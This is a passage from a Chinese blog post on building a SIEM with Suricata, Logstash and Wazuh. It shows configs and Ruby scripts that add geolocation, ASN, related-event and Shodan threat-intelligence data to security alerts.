class="string">&quot;translation_as&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a><strong>Yaml</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/private_ip_geo.yml">private_ip_geo.yml</a></strong></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;192.168.199.\d+&#x27;</span><span class="string">:</span> <span class="string">&#x27;&#123;&quot;location&quot;:&#123;&quot;lat&quot;:45.8491,&quot;lon&quot;:-119.7143&#125;,&quot;country_name&quot;:&quot;China&quot;,&quot;country_iso_code&quot;:&quot;CN&quot;,&quot;region_name&quot;:&quot;Jiangsu&quot;,&quot;region_iso_code&quot;:&quot;JS&quot;,&quot;city_name&quot;:&quot;Nanjing&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/private_ip_asn.yml">private_ip_asn.yml</a></strong></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;192.168.199.\d+&#x27;</span><span class="string">:</span> <span class="string">&#x27;&#123;&quot;number&quot;:4134,&quot;organization.name&quot;:&quot;CHINANET-BACKBONE&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/add-geo_ip-2.png" alt="image-20201209110617996"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/add-geo_ip-1.png" alt="image-20201208153642680"></p>
<hr>
<h5 id="2-1-4-add-geo-public-ip"><a href="#2-1-4-add-geo-public-ip" class="headerlink" title="2.1.4 add_geo-public_ip"></a>2.1.4 add_geo-public_ip</h5><p>​    外网IP就比较好搞定了直接加载GeoIP数据即可。</p>
<h6 id="Logstash-Conifg-1"><a href="#Logstash-Conifg-1" class="headerlink" title="Logstash Conifg"></a><strong>Logstash Conifg</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/71_enrichment-geo_public_ip.conf">add-geo_public_ip.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> ! [<span class="built_in">source</span>][geo] &#123;</span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[source][geo]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;city_name&quot;</span>, <span class="string">&quot;country_name&quot;</span>, <span class="string">&quot;country_code2&quot;</span>, <span class="string">&quot;region_name&quot;</span>, <span class="string">&quot;region_code&quot;</span>, <span class="string">&quot;location&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-City.mmdb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[source][as]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;autonomous_system_organization&quot;</span>, <span class="string">&quot;autonomous_system_number&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-ASN.mmdb&quot;</span></span><br><span class="line">            default_database_type =&gt; <span class="string">&quot;ASN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> ! [destination][geo] &#123;</span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[destination][geo]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;city_name&quot;</span>, <span class="string">&quot;country_name&quot;</span>, <span class="string">&quot;country_code2&quot;</span>, <span class="string">&quot;region_name&quot;</span>, <span class="string">&quot;region_code&quot;</span>, <span class="string">&quot;location&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-City.mmdb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[destination][as]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;autonomous_system_organization&quot;</span>, <span class="string">&quot;autonomous_system_number&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-ASN.mmdb&quot;</span></span><br><span class="line">            default_database_type =&gt; <span class="string">&quot;ASN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][geo][country_code2]&quot;</span>, <span class="string">&quot;[source][geo][country_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][geo][region_code]&quot;</span>, <span class="string">&quot;[source][geo][region_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][as][asn]&quot;</span>, <span class="string">&quot;[source][as][number]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][as][as_org]&quot;</span>, <span class="string">&quot;[source][as][organization.name]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][geo][country_code2]&quot;</span>, <span class="string">&quot;[destination][geo][country_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][geo][region_code]&quot;</span>, <span class="string">&quot;[destination][geo][region_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][as][asn]&quot;</span>, <span class="string">&quot;[destination][as][number]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][as][as_org]&quot;</span>, <span class="string">&quot;[destination][as][organization.name]&quot;</span>]</span><br><span class="line"></span><br><span class="line">        remove_tag =&gt; [ <span class="string">&quot;_geoip_lookup_failure&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-2-enrichment-alarm-from-siem"><a href="#2-2-enrichment-alarm-from-siem" class="headerlink" title="2.2 enrichment-alarm_from_siem"></a>2.2 enrichment-alarm_from_siem</h4><p>​        针对alarm事件进行丰富化，也就是SIEM发出的数据。上图中红色线所示部分</p>
<h5 id="2-2-1-enrichment-related-event-id-for-wazuh"><a href="#2-2-1-enrichment-related-event-id-for-wazuh" class="headerlink" title="2.2.1 enrichment-related_event_id_for_wazuh"></a>2.2.1 enrichment-related_event_id_for_wazuh</h5><p>​    为SIEM告警增加了<strong>Hunting</strong>的功能，通过该功能可直接溯源到触发alarm的所有alert事件。</p>
<h6 id="Logstash-Config-10"><a href="#Logstash-Config-10" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-related.conf"><strong>enrichment-related_event_id_for_wazuh.conf</strong></a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> and [related][event][<span class="built_in">log</span>] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/add_related_event_id.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-2"><a href="#Ruby-Code-2" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/add_related_event_id.rb">enrichment-related_event_id_for_wazuh.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@pattern</span> = <span class="regexp">/(?:\\n)?\w+ \d+ \d+:\d+:\d+ logstash NORMALIZED\[-\]: /</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    event_id = []</span><br><span class="line">    rule_id = []</span><br><span class="line">    rule_name = []</span><br><span class="line">    event_log = event.get(<span class="string">&#x27;[related][event][log]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    atomic_rules = event_log.split(<span class="variable">@pattern</span>)[<span class="number">1</span> .. -<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> atomic <span class="keyword">in</span> atomic_rules <span class="keyword">do</span></span><br><span class="line">        e_id = JSON.parse(atomic)[<span class="string">&#x27;event&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        r_id = JSON.parse(atomic)[<span class="string">&#x27;rule&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        r_name = JSON.parse(atomic)[<span class="string">&#x27;rule&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        event_id.push(e_id)</span><br><span class="line">        rule_id.push(r_id)</span><br><span class="line">        rule_name.push(r_name)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    event.set(<span class="string">&#x27;[related][event][id]&#x27;</span>, event_id)</span><br><span class="line">    event.set(<span class="string">&#x27;[related][rule][id]&#x27;</span>, rule_id)</span><br><span class="line">    event.set(<span class="string">&#x27;[related][rule][name]&#x27;</span>, rule_name)</span><br><span class="line">    event.remove(<span class="string">&#x27;[related][event][log]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h6><p>​        以下是一个Wazuh聚合告警，分析人员通过点击<code>threat.hunting.event.id</code>字段即可溯源出触发该聚合规则的底层alert事件。</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/hunting-alarm.png" alt="image-20201204175051910"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/hunting-alert.png" alt="image-20201204175244182"></p>
<hr>
<h3 id="3-Threat-Intelligence"><a href="#3-Threat-Intelligence" class="headerlink" title="3. Threat Intelligence"></a>3. Threat Intelligence</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat-intelligence.png" alt="threat-intelligence"></p>
<h4 id="3-1-threatIntel-alert-to-siem"><a href="#3-1-threatIntel-alert-to-siem" class="headerlink" title="3.1 threatIntel_alert_to_siem"></a>3.1 threatIntel_alert_to_siem</h4><p>​        通过Logstash加载Ruby脚本，将IoC推送至Redis。为了避免重复推送，每个IoC都会设置超时时间（默认7天）。如上图中蓝色线所示部分；</p>
<h5 id="3-1-1-add-ti-shodan"><a href="#3-1-1-add-ti-shodan" class="headerlink" title="3.1.1 add-ti_shodan"></a>3.1.1 add-ti_shodan</h5><p>​        对于攻击过我们的IP地址我们都会利用<strong>Shodan</strong>进行反向探测，收集一波攻击者（肉鸡）的资产信息，留给后面分析人员用。由于已经设置了IoC超时时间，所以在超时之前IoC不会重复推送。当然，单个Key调用API频率还是要控制一下的，不过你可以选择多个Key哦。<strong>你懂的</strong>😈😈😈</p>
<h6 id="Logstash-Config-11"><a href="#Logstash-Config-11" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-ti_shodan.conf">add-ti_shodan.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-ti_shodan.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;ti_db&quot;</span> =&gt; 1</span><br><span class="line">                <span class="string">&quot;alert_prefix&quot;</span> =&gt; <span class="string">&quot;alert:&quot;</span></span><br><span class="line">                <span class="string">&quot;expire&quot;</span> =&gt; 86400</span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;spider_db&quot;</span> =&gt; 5</span><br><span class="line">                <span class="string">&quot;spider_key&quot;</span> =&gt; <span class="string">&quot;spider:shodan:ioc&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-3"><a href="#Ruby-Code-3" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-ti_shodan.rb">add-ti_shodan.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@expire</span> = params[<span class="string">&quot;expire&quot;</span>]</span><br><span class="line">    <span class="variable">@alert</span> = params[<span class="string">&quot;alert_prefix&quot;</span>]</span><br><span class="line">    <span class="variable">@alarm</span> = params[<span class="string">&quot;alarm_prefix&quot;</span>]</span><br><span class="line">    <span class="variable">@spider_key</span> = params[<span class="string">&quot;spider_key&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># connect to redis</span></span><br><span class="line">    <span class="variable">@ti_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;ti_db&quot;</span>])</span><br><span class="line">    <span class="variable">@spider_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;spider_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        ipaddr_src = IPAddr.new src_ip</span><br><span class="line">        ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line">    <span class="keyword">rescue</span> Exception =&gt; e</span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ipaddr_src.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = src_ip</span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> ipaddr_dst.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = dst_ip</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> [event]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> event.get(<span class="string">&quot;[event][kind]&quot;</span>) == <span class="string">&quot;alert&quot;</span> <span class="keyword">then</span></span><br><span class="line">        alert_ioc = <span class="variable">@alert</span> + ioc</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable">@ti_redis</span>.exists?(alert_ioc) <span class="keyword">then</span></span><br><span class="line">            <span class="variable">@ti_redis</span>.setex(alert_ioc, <span class="variable">@expire</span>, <span class="literal">true</span>)</span><br><span class="line">            <span class="variable">@spider_redis</span>.lpush(<span class="variable">@spider_key</span>, ioc)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-threatIntel-alarm-from-siem"><a href="#3-2-threatIntel-alarm-from-siem" class="headerlink" title="3.2 threatIntel_alarm_from_siem"></a>3.2 threatIntel_alarm_from_siem</h4><p>​        通过Logstash进行威胁情报数据的丰富化。如上图中红色线所示部分；</p>
<h5 id="3-2-1-add-ti-tags-from-shodan"><a href="#3-2-1-add-ti-tags-from-shodan" class="headerlink" title="3.2.1 add-ti_tags_from_shodan"></a>3.2.1 add-ti_tags_from_shodan</h5><p>​        将Shodan IoC情报数据丰富化至alarm。</p>
<h6 id="Logstash-Config-12"><a href="#Logstash-Config-12" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-ti_shodan.conf">add-ti_tags_from_shodan.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/ti_shodan.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;ti_db&quot;</span> =&gt; 1</span><br><span class="line">                <span class="string">&quot;alarm_prefix&quot;</span> =&gt; <span class="string">&quot;alarm:&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-4"><a href="#Ruby-Code-4" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-ti_shodan.rb">add-ti_tags_from_shodan.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@alarm</span> = params[<span class="string">&quot;alarm_prefix&quot;</span>]</span><br><span class="line">    <span class="comment"># connect to redis</span></span><br><span class="line">    <span class="variable">@ti_redis</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;ti_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        ipaddr_src = IPAddr.new src_ip</span><br><span class="line">        ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line">    <span class="keyword">rescue</span> Exception =&gt; e</span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ipaddr_src.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = src_ip</span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> ipaddr_dst.private?() <span class="keyword">then</span></span><br><span class="line">        ioc = dst_ip</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> [event]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    raw_data = <span class="variable">@ti_redis</span>.get(<span class="variable">@alarm</span> + ioc)</span><br><span class="line">    <span class="keyword">if</span> raw_data <span class="keyword">then</span></span><br><span class="line">        data = JSON.parse(raw_data)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">then</span></span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][services]&quot;</span>, data[<span class="string">&quot;services&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][vulns]&quot;</span>, data[<span class="string">&quot;vulns&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][ports]&quot;</span>, data[<span class="string">&quot;ports&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][hostnames]&quot;</span>, data[<span class="string">&quot;hostnames&quot;</span>])</span><br><span class="line">            event.set(<span class="string">&quot;[threat][hunting][domains]&quot;</span>, data[<span class="string">&quot;domains&quot;</span>])</span><br><span class="line">            <span class="keyword">if</span> data[<span class="string">&quot;details&quot;</span>] <span class="keyword">then</span></span><br><span class="line">                details = data[<span class="string">&quot;details&quot;</span>].to_json</span><br><span class="line">                event.set(<span class="string">&quot;[threat][hunting][details]&quot;</span>, details)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span 